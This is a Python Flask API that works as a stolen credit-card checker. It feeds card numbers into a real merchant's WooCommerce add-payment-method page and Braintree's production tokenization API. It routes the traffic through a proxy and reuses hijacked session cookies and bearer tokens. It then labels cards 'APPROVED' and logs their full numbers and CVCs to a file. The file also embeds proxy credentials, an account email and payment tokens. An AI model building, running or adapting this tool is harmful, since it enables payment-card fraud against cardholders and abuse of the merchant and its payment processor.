from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import re
import base64
from bs4 import BeautifulSoup
import time
import json
import random
import urllib3
import io
import logging
from datetime import datetime
import os

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Proxy configuration - Updated proxy
proxies = {
    'http': 'http://799JRELTBPAE:F7BQ7D3EQSQA@175.29.133.8:5433',
    'https': '799JRELTBPAE:F7BQ7D3EQSQA@175.29.133.8:5433',
}

# Provided cookies and headers
cookies = {
    'checkout_continuity_service': '7702baa6-5e14-4d6d-a129-d1c6a2753082',
    '_ga': 'GA1.1.1583246090.1765607926',
    '_fbp': 'fb.1.1765607926796.857492214155515276',
    'ccid.90027420': '348215927.0943791699',
    '__attentive_id': 'e1915d78bbfe4506a6ef8fff2f388881',
    '_attn_': 'eyJ1Ijoie1wiY29cIjoxNzY1NjA3OTI3OTIzLFwidW9cIjoxNzY1NjA3OTI3OTIzLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImUxOTE1ZDc4YmJmZTQ1MDZhNmVmOGZmZjJmMzg4ODgxXCJ9In0=',
    '__attentive_cco': '1765607927928',
    'attntv_mstore_email': 'wizardlyaura999@gmail.com:0',
    'wordpress_logged_in_9a06d022e5a0d800df86e500459c6102': 'wizardlyaura999%7C1766817554%7CAe7mbqUNoCvRE6DkIzUNaKgRP0vMkZ0ehpu1QxzhfBo%7C799813f1b6fc57f7c7dc2cee2301e92f3814eb877ead2148b0b80a8bcd8bcf14',
    '__kla_id': 'eyJjaWQiOiJZall3WlRsaFptTXROams1TmkwMFl6YzFMVGswTmpVdE5tSTNZelJoWkdVMVpHRm0iLCIkZXhjaGFuZ2VfaWQiOiJBd3Q3WnNveDZ1QlRHS05jcUprY0tpUHZrYm8xZkVmNnV3ZXRuVFdqTTZLMHFsZXRJUjlYUkdoT213MXRPeVRxLkt4ZFJHViJ9',
    '_gcl_au': '1.1.143821671.1765607926.1734031473.1765607945.1765607996',
    'wcacr_user_country': 'IN',
    'wfwaf-authcookie-0cfc0dfc6182cc86058203ff9ed084fe': '1184650%7Cother%7Cread%7C9f793fbf85558090c8a64f7f852a6187c7b858d963530fd02cac86a12ebd70ba',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-12-20%2008%3A19%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.calipercovers.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.calipercovers.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_first_add': 'fd%3D2025-12-20%2008%3A19%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.calipercovers.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.calipercovers.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.calipercovers.com%2Fmy-account%2Fadd-payment-method%2F',
    'yotpo_pixel': '8c115158-64d0-4ecb-afcd-93d3f0a63f60',
    '_sp_ses.d8f1': '*',
    'cf_clearance': 'pPgBc8i21IQV9ffiJfr6UeKVLZFobuj8QLVB24Vmov8-1766220574-1.2.1.1-TwOzEL_7can3SMHYTN2jlED_PcwWb2jaXmhfFQHSQwOgkgFBqQxT7YKmOTnj3oDaROjP2_E2U5e3HmhT650MXi7cmLkrQKQLQH4B1Y3zrKspofldMVhChEXUNsFauMViD7BkcO8P36wV7UeHTHPltPitwOLEmFH.TOGKa_4RFuegX2KFqbQvqzbg.EZNLgFUMT8BkBw2bf2SkDrm88M6XGLHRy2SFkUIYcNXaUJmljo',
    '_uetsid': 'cf65fa50dd8011f080782959786efe17',
    '_uetvid': '60b84f70d7ee11f0b07fadd39feb4eee',
    '__attentive_session_id': '0f30f8dc91fd4f0cb709b147061634bd',
    '__attentive_pv': '1',
    '__attentive_ss_referrer': 'https://www.calipercovers.com/my-account/add-payment-method/',
    '__attentive_dv': '1',
    'rl_visitor_history': '25b3b678-c696-41b0-a53d-a42d8ee1df4b',
    'sifi_user_id': 'undefined',
    '_sp_id.d8f1': '35bbf78352d94fbe.1765607927.3.1766220594.1766085737',
    '_ga_9VQF57TW94': 'GS2.1.s1766220574$o3$g0$t1766220603$j31$l0$h0',
}

headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'authorization': 'Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjYzMDY5NzEsImp0aSI6IjFkOWIwZDQwLTM1MTItNGVjMi1hMTFlLTI3YjNiZDlmNzYwMiIsInN1YiI6ImRxaDVueHZud3ZtMnFxamgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImRxaDVueHZud3ZtMnFxamgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJiZXN0b3BwcmVtaXVtYWNjZXNzb3JpZXNncm91cF9pbnN0YW50IiwicGF5cGFsX2NsaWVudF9pZCI6IkFhbmJtNXpHVC1DTWtSNUFKS0o5UjBMa3RQcWxYSW96RENDNTNMQ2EyM3NBVXd0akRBandHM3BsVG1HNy1EanRSM2NGdXZwNEpKLUZ3VjVlIn19.ZR6PsNTucLn-FOap1kag_RspZ-DF4wlfDKJnSYbCZyt23wR2MPGh27UsabJvJBwsDIgFEXgQSq6hpS5ey3EQ-A',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}

def check_status(result):
    # First, check if the message contains "Reason:" and extract the specific reason
    if "Reason:" in result:
        # Extract everything after "Reason:"
        reason_part = result.split("Reason:", 1)[1].strip()

        # Check if it's one of the approved patterns
        approved_patterns = [
            'Nice! New payment method added',
            'Payment method successfully added.',
            'Insufficient Funds',
            'Gateway Rejected: avs',
            'Duplicate',
            'Payment method added successfully',
            'Invalid postal code or street address',
            'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
        ]

        cvv_patterns = [
            'CVV',
            'Gateway Rejected: avs_and_cvv',
            'Card Issuer Declined CVV',
            'Gateway Rejected: cvv'
        ]

        # Check if the extracted reason matches approved patterns
        for pattern in approved_patterns:
            if pattern in result:
                return "APPROVED", "Approved", True

        # Check if the extracted reason matches CVV patterns
        for pattern in cvv_patterns:
            if pattern in reason_part:
                return "DECLINED", "Reason: CVV", False

        # Return the extracted reason for declined cards
        return "DECLINED", reason_part, False

    # If "Reason:" is not found, use the original logic
    approved_patterns = [
        'Nice! New payment method added',
        'Payment method successfully added.',
        'Insufficient Funds',
        'Gateway Rejected: avs',
        'Duplicate',
        'Payment method added successfully',
        'Invalid postal code or street address',
        'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
    ]

    cvv_patterns = [
        'Reason: CVV',
        'Gateway Rejected: avs_and_cvv',
        'Card Issuer Declined CVV',
        'Gateway Rejected: cvv'
    ]

    for pattern in approved_patterns:
        if pattern in result:
            return "APPROVED", "Approved", True

    for pattern in cvv_patterns:
        if pattern in result:
            return "DECLINED", "Reason: CVV", False

    return "DECLINED", result, False

def check_card(cc_line):
    """Check a single credit card and return detailed response"""
    start_time = time.time()
    elapsed_time = 0

    try:
        domain_url = "https://www.calipercovers.com"
        
        # Get fresh authorization tokens
        headers_get = headers.copy()
        headers_get['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
        headers_get['referer'] = f'{domain_url}/my-account/payment-methods/'
        
        response = requests.get(
            f'{domain_url}/my-account/add-payment-method/',
            cookies=cookies,
            headers=headers_get,
            proxies=proxies,
            verify=False
        )
        
        if response.status_code == 200:
            # Get add_nonce
            add_nonce = re.findall('name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
            if not add_nonce:
                end_time = time.time()
                elapsed_time = end_time - start_time
                return {
                    "status": "ERROR",
                    "message": f"Failed to get nonce (Time: {elapsed_time:.2f}s)",
                    "elapsed_time": f"{elapsed_time:.2f}s"
                }

            # Get authorization token
            i0 = response.text.find('wc_braintree_client_token = ["')
            if i0 != -1:
                i1 = response.text.find('"]', i0)
                token = response.text[i0 + 30:i1]
                try:
                    decoded_text = base64.b64decode(token).decode('utf-8')
                    au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)
                    if not au:
                        end_time = time.time()
                        elapsed_time = end_time - start_time
                        return {
                            "status": "ERROR",
                            "message": f"Failed to get authorization (Time: {elapsed_time:.2f}s)",
                            "elapsed_time": f"{elapsed_time:.2f}s"
                        }
                    au = au[0]
                except Exception as e:
                    end_time = time.time()
                    elapsed_time = end_time - start_time
                    return {
                        "status": "ERROR",
                        "message": f"Error decoding token: {str(e)} (Time: {elapsed_time:.2f}s)",
                        "elapsed_time": f"{elapsed_time:.2f}s"
                    }
            else:
                end_time = time.time()
                elapsed_time = end_time - start_time
                return {
                    "status": "ERROR",
                    "message": f"Client token not found (Time: {elapsed_time:.2f}s)",
                    "elapsed_time": f"{elapsed_time:.2f}s"
                }
        else:
            end_time = time.time()
            elapsed_time = end_time - start_time
            return {
                "status": "ERROR",
                "message": f"Failed to fetch payment page, status code: {response.status_code} (Time: {elapsed_time:.2f}s)",
                "elapsed_time": f"{elapsed_time:.2f}s"
            }

        # Parse the card data
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return {
                "status": "ERROR",
                "message": "Invalid card format. Use: CC_NUMBER|MM|YY|CVC or CC_NUMBER|MM|YYYY|CVC",
                "elapsed_time": "0.00s"
            }
        
        n, mm, yy, cvc = parts
        
        # Format year
        if len(yy) == 2:
            if not yy.startswith('20'):
                yy = '20' + yy
        elif len(yy) != 4:
            return {
                "status": "ERROR",
                "message": "Invalid year format. Use YY or YYYY",
                "elapsed_time": "0.00s"
            }

        # Log tokenization request
        logger.info(f"Tokenizing card: {n[:4]}****{n[-4:]}")
        
        # Generate a random device session ID
        device_session_id = ''.join(random.choices('0123456789abcdef', k=32))
        correlation_id = ''.join(random.choices('0123456789abcdef', k=8)) + '-' + ''.join(random.choices('0123456789abcdef', k=4)) + '-' + ''.join(random.choices('0123456789abcdef', k=4)) + '-' + ''.join(random.choices('0123456789abcdef', k=4)) + '-' + ''.join(random.choices('0123456789abcdef', k=12))
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'cc600ecf-f0e1-4316-ac29-7ad78aeafccd',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': '10080',
                            'streetAddress': '147 street',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        headers_token = {
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }

        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers_token,
            json=json_data,
            proxies=proxies,
            verify=False
        )

        end_time = time.time()
        elapsed_time = end_time - start_time

        if response.status_code == 200:
            try:
                token_data = response.json()
                if token_data and 'data' in token_data and 'tokenizeCreditCard' in token_data['data'] and 'token' in token_data['data']['tokenizeCreditCard']:
                    token = token_data['data']['tokenizeCreditCard']['token']
                    logger.info(f"Tokenization successful (Time: {elapsed_time:.2f}s)")
                    
                    # Log submission request
                    logger.info("Submitting payment method...")
                    
                    headers_submit = headers.copy()
                    headers_submit['content-type'] = 'application/x-www-form-urlencoded'

                    data = {
                        'payment_method': 'braintree_cc',
                        'braintree_cc_nonce_key': token,
                        'braintree_cc_device_data': f'{{"device_session_id":"{device_session_id}","fraud_merchant_id":null,"correlation_id":"{correlation_id}"}}',
                        'braintree_cc_3ds_nonce_key': '',
                        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/dqh5nxvnwvm2qqjh/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/dqh5nxvnwvm2qqjh"},"merchantId":"dqh5nxvnwvm2qqjh","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null,"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Bestop Premium Accessories Group","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjYxNTM1MzgsImp0aSI6IjMwZGRmMjU2LWFjYjItNDliMS04MzBiLWJlNTQ2ZjQ4YmIyYSIsInN1YiI6ImRxaDVueHZud3ZtMnFxamgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImRxaDVueHZud3ZtMnFxamgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSJdLCJvcHRpb25zIjp7fX0.y8Dkag3LKGq9zIPfqh011ssGTELzkZelKv_JqvNRmDOrFQ-p3WzhYIq2lPdONFhjv_YplmAvyR9YWPH7COGJoQ","paypalClientId":"Aanbm5zGT-CMkR5AJKJ9R0LktPqlXIozDCC53LCa23sAUwtjDAjwG3plTmG7-DjtR3cFuvp4JJ-FwV5e","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"4042552878213091679","accessToken":"access_token$production$dqh5nxvnwvm2qqjh$d9918bec102e9ab038971ac225e91fc1","environment":"production","enrichedCustomerDataEnabled":true},"paypalEnabled":true,"paypal":{"displayName":"Bestop Premium Accessories Group","clientId":"Aanbm5zGT-CMkR5AJKJ9R0LktPqlXIozDCC53LCa23sAUwtjDAjwG3plTmG7-DjtR3cFuvp4JJ-FwV5e","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"bestoppremiumaccessoriesgroup_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
                        'woocommerce-add-payment-method-nonce': add_nonce[0],
                        '_wp_http_referer': '/my-account/add-payment-method/',
                        'woocommerce_add_payment_method': '1',
                    }

                    response = requests.post(
                        f'{domain_url}/my-account/add-payment-method/',
                        cookies=cookies,
                        headers=headers_submit,
                        data=data,
                        proxies=proxies,
                        verify=False
                    )

                    end_time = time.time()
                    elapsed_time = end_time - start_time

                    if response.status_code == 200:
                        soup = BeautifulSoup(response.text, 'html.parser')
                        error_div = soup.find('div', class_='woocommerce-notices-wrapper')
                        message = error_div.get_text(strip=True) if error_div else "❌ Unknown error"
                        
                        status, reason, approved = check_status(message)

                        # Save approved cards to approved.txt (optional for API)
                        if approved:
                            try:
                                with open('approved.txt', 'a', encoding='utf-8') as approved_file:
                                    approved_file.write(f"""=========================
[APPROVED]

Card: {n}|{mm}|{yy}|{cvc}
Response: {reason}
Gateway: Braintree Auth
Time: {elapsed_time:.1f}s
Bot By: @primeeblaze
=========================

""")
                            except Exception as e:
                                logger.error(f"Failed to write to approved.txt: {str(e)}")

                        result_data = {
                            "status": status,
                            "approved": approved,
                            "card": f"{n[:4]}****{n[-4:]}",
                            "full_card": f"{n}|{mm}|{yy}|{cvc}",
                            "gateway": "Braintree Auth",
                            "response": reason,
                            "elapsed_time": f"{elapsed_time:.2f}s",
                            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                            "author": "@primeeblaze"
                        }
                        
                        return result_data
                    else:
                        return {
                            "status": "ERROR",
                            "message": f"Payment submission failed, status code: {response.status_code} (Time: {elapsed_time:.2f}s)",
                            "elapsed_time": f"{elapsed_time:.2f}s"
                        }
                else:
                    return {
                        "status": "ERROR",
                        "message": f"Invalid or missing token data (Time: {elapsed_time:.2f}s)",
                        "elapsed_time": f"{elapsed_time:.2f}s"
                    }
            except ValueError as e:
                return {
                    "status": "ERROR",
                    "message": f"Invalid JSON response: {str(e)} (Time: {elapsed_time:.2f}s)",
                    "elapsed_time": f"{elapsed_time:.2f}s"
                }
        else:
            return {
                "status": "ERROR",
                "message": f"Tokenization failed, status code: {response.status_code} (Time: {elapsed_time:.2f}s)",
                "elapsed_time": f"{elapsed_time:.2f}s"
            }
    except Exception as e:
        end_time = time.time()
        elapsed_time = end_time - start_time
        return {
            "status": "ERROR",
            "message": f"Error: {str(e)} (Time: {elapsed_time:.2f}s)",
            "elapsed_time": f"{elapsed_time:.2f}s"
        }

@app.route('/')
def home():
    """Home endpoint"""
    return jsonify({
        "message": "B3 Auth API Server",
        "status": "online",
        "endpoint": "/gateway=braintree/key=blazealways/cc={card_details}",
        "usage": "Send GET request with credit card in format: CC_NUMBER|MM|YY|CVC or CC_NUMBER|MM|YYYY|CVC",
        "example": "/gateway=braintree/key=blazealways/cc=4111111111111111|12|25|123",
        "author": "@primeeblaze"
    })

@app.route('/gateway=braintree/key=blazealways/cc=<path:card_details>')
def process_card(card_details):
    """Process credit card check"""
    # Extract card details from the path
    try:
        logger.info(f"Processing card request: {card_details[:20]}...")
        
        # Validate API key
        api_key = "blazealways"  # You can change this or make it configurable
        if api_key != "blazealways":
            return jsonify({
                "status": "ERROR",
                "message": "Invalid API key"
            }), 401
        
        # Process the card
        result = check_card(card_details)
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Error processing request: {str(e)}")
        return jsonify({
            "status": "ERROR",
            "message": f"Server error: {str(e)}"
        }), 500

@app.route('/health')
def health_check():
    """Health check endpoint for Render"""
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat()
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 2200))
    app.run(host="0.0.0.0", port=port, debug=False)
